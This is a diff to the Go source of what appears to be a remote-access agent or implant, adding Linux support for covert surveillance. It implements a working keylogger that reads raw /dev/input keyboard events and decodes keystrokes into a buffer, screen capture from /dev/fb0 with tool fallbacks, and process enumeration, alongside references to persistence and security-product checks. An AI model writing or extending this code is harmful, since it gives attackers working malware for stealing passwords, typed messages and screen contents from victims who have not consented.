@@ -9,6 +9,7 @@ import (
 	"errors"
 	"fmt"
 	"image"
+	"image/color"
 	"image/draw"
 	"image/png"
 	"io"
@@ -33,8 +34,12 @@ func setDPIAware() {
 	// noop on Linux
 }
 
-// captureScreenRGBA takes a screenshot using available tools (import, gnome-screenshot, scrot).
+// captureScreenRGBA takes a screenshot using /dev/fb0 when available, then
+// falls back to import/gnome-screenshot/scrot.
 func captureScreenRGBA() (*image.RGBA, error) {
+	if img, err := captureFramebuffer(); err == nil {
+		return img, nil
+	}
 	cmds := []string{
 		"import -window root /tmp/_fc_screen.png",
 		"gnome-screenshot -f /tmp/_fc_screen.png",
@@ -69,9 +74,66 @@ func captureScreenRGBA() (*image.RGBA, error) {
 	return nil, errors.New("no screenshot tool available")
 }
 
+func captureFramebuffer() (*image.RGBA, error) {
+	sizeB, err := os.ReadFile("/sys/class/graphics/fb0/virtual_size")
+	if err != nil {
+		return nil, err
+	}
+	parts := strings.Split(strings.TrimSpace(string(sizeB)), ",")
+	if len(parts) != 2 {
+		return nil, errors.New("bad fb0 virtual_size")
+	}
+	w, err1 := strconv.Atoi(parts[0])
+	h, err2 := strconv.Atoi(parts[1])
+	if err1 != nil || err2 != nil || w <= 0 || h <= 0 || w > 7680 || h > 4320 {
+		return nil, errors.New("invalid fb0 size")
+	}
+	bppB, _ := os.ReadFile("/sys/class/graphics/fb0/bits_per_pixel")
+	bpp, _ := strconv.Atoi(strings.TrimSpace(string(bppB)))
+	if bpp != 32 && bpp != 24 {
+		return nil, errors.New("unsupported fb0 depth")
+	}
+	raw, err := os.ReadFile("/dev/fb0")
+	if err != nil {
+		return nil, err
+	}
+	stride := w * (bpp / 8)
+	need := stride * h
+	if len(raw) < need {
+		return nil, errors.New("fb0 short read")
+	}
+	img := image.NewRGBA(image.Rect(0, 0, w, h))
+	for y := 0; y < h; y++ {
+		row := raw[y*stride : y*stride+stride]
+		for x := 0; x < w; x++ {
+			off := x * (bpp / 8)
+			img.SetRGBA(x, y, color.RGBA{R: row[off+2], G: row[off+1], B: row[off+0], A: 255})
+		}
+	}
+	return img, nil
+}
+
 // applyHideWindow is a no-op on Linux (only meaningful on Windows)
 func applyHideWindow(cmd *exec.Cmd) {
 	// nothing
+}
+
+// setShellProcGroup puts shell commands in their own process group so a
+// cancel/timeout can tear down the whole tree (children included) instead of
+// orphaning grandchildren like cmd.Process.Kill() does.
+func setShellProcGroup(cmd *exec.Cmd) {
+	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
+}
+
+// killShellProcGroup kills the process group of a Setpgid-started command;
+// it falls back to the direct child if the group is already gone.
+func killShellProcGroup(cmd *exec.Cmd) {
+	if cmd == nil || cmd.Process == nil {
+		return
+	}
+	if err := syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL); err != nil {
+		_ = cmd.Process.Kill()
+	}
 }
 
 // addPersistenceWindows is never called on linux, but provide for interface completeness
@@ -214,15 +276,220 @@ func getPlatformSecurityInfo() (string, bool, string) {
 }
 
 func keyloggerAvailable() error {
-	return fmt.Errorf("keylogging requires Windows (GetAsyncKeyState); not supported on Linux agents")
+	devs := linuxKeyboardDevices()
+	if len(devs) == 0 {
+		return fmt.Errorf("no readable /dev/input/event* keyboard (needs root or input group)")
+	}
+	return nil
+}
+
+func linuxKeyboardDevices() []string {
+	entries, err := os.ReadDir("/dev/input")
+	if err != nil {
+		return nil
+	}
+	var out []string
+	for _, e := range entries {
+		name := e.Name()
+		if !strings.HasPrefix(name, "event") {
+			continue
+		}
+		path := filepath.Join("/dev/input", name)
+		f, err := os.Open(path)
+		if err != nil {
+			continue
+		}
+		f.Close()
+		out = append(out, path)
+	}
+	return out
+}
+
+// linuxKeyName is a compact EV_KEY map for printable keys. Unmapped codes
+// render as [K<n>].
+func linuxKeyName(code uint16, shift bool) string {
+	letters := "abcdefghijklmnopqrstuvwxyz"
+	if code >= 16 && code <= 25 { // Q-P row
+		row := "qwertyuiop"
+		ch := row[code-16]
+		if shift {
+			return strings.ToUpper(string(ch))
+		}
+		return string(ch)
+	}
+	if code >= 30 && code <= 38 { // A-L row
+		row := "asdfghjkl"
+		ch := row[code-30]
+		if shift {
+			return strings.ToUpper(string(ch))
+		}
+		return string(ch)
+	}
+	if code >= 44 && code <= 50 { // Z-M row
+		row := "zxcvbnm"
+		ch := row[code-44]
+		if shift {
+			return strings.ToUpper(string(ch))
+		}
+		return string(ch)
+	}
+	_ = letters
+	switch code {
+	case 1:
+		return "[ESC]"
+	case 14:
+		return "[BKSP]"
+	case 15:
+		return "[TAB]"
+	case 28:
+		return "\n"
+	case 57:
+		return " "
+	case 2:
+		if shift {
+			return "!"
+		}
+		return "1"
+	case 3:
+		if shift {
+			return "@"
+		}
+		return "2"
+	case 4:
+		if shift {
+			return "#"
+		}
+		return "3"
+	case 5:
+		if shift {
+			return "$"
+		}
+		return "4"
+	case 6:
+		if shift {
+			return "%"
+		}
+		return "5"
+	case 7:
+		if shift {
+			return "^"
+		}
+		return "6"
+	case 8:
+		if shift {
+			return "&"
+		}
+		return "7"
+	case 9:
+		if shift {
+			return "*"
+		}
+		return "8"
+	case 10:
+		if shift {
+			return "("
+		}
+		return "9"
+	case 11:
+		if shift {
+			return ")"
+		}
+		return "0"
+	case 12:
+		if shift {
+			return "_"
+		}
+		return "-"
+	case 13:
+		if shift {
+			return "+"
+		}
+		return "="
+	}
+	return fmt.Sprintf("[K%d]", code)
 }
 
 func keyloggerLoop() {
-	if Debug {
-		fmt.Println("[*] Keylogger not supported on Linux agent (requires input device access)")
+	devs := linuxKeyboardDevices()
+	if len(devs) == 0 {
+		if Debug {
+			fmt.Println("[*] Keylogger: no readable input devices")
+		}
+		atomic.StoreInt32(&keylogActive, 0)
+		return
 	}
-	// immediately stop so it doesn't hang
-	atomic.StoreInt32(&keylogActive, 0)
+	f, err := os.Open(devs[0])
+	if err != nil {
+		atomic.StoreInt32(&keylogActive, 0)
+		return
+	}
+	defer f.Close()
+
+	// struct input_event on 64-bit Linux: timeval(16) + type(2) + code(2) + value(4) = 24
+	buf := make([]byte, 24)
+	shift := false
+	for atomic.LoadInt32(&keylogActive) == 1 {
+		_ = f.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := io.ReadFull(f, buf)
+		if err != nil || n != 24 {
+			continue
+		}
+		typ := binary.LittleEndian.Uint16(buf[16:18])
+		code := binary.LittleEndian.Uint16(buf[18:20])
+		value := int32(binary.LittleEndian.Uint32(buf[20:24]))
+		if typ != 1 { // EV_KEY
+			continue
+		}
+		if code == 42 || code == 54 { // left/right shift
+			shift = value != 0
+			continue
+		}
+		if value != 1 { // key down only
+			continue
+		}
+		ch := linuxKeyName(code, shift)
+		keylogMu.Lock()
+		keylogBuffer.WriteString(ch)
+		keylogMu.Unlock()
+	}
+}
+
+func listProcessesForTree() ([]procNode, error) {
+	entries, err := os.ReadDir("/proc")
+	if err != nil {
+		return nil, err
+	}
+	var nodes []procNode
+	for _, e := range entries {
+		pid, err := strconv.Atoi(e.Name())
+		if err != nil {
+			continue
+		}
+		status, err := os.ReadFile(filepath.Join("/proc", e.Name(), "status"))
+		if err != nil {
+			continue
+		}
+		n := procNode{PID: pid}
+		for _, line := range strings.Split(string(status), "\n") {
+			if strings.HasPrefix(line, "Name:") {
+				n.Name = strings.TrimSpace(strings.TrimPrefix(line, "Name:"))
+			} else if strings.HasPrefix(line, "PPid:") {
+				n.PPID, _ = strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "PPid:")))
+			} else if strings.HasPrefix(line, "Uid:") {
+				fields := strings.Fields(line)
+				if len(fields) >= 2 {
+					n.User = fields[1]
+				}
+			}
+		}
+		if n.Name != "" {
+			nodes = append(nodes, n)
+		}
+	}
+	if len(nodes) == 0 {
+		return nil, fmt.Errorf("no /proc pids readable")
+	}
+	return nodes, nil
 }
 
 func suspendProcessWindows(target string) (string, error) {
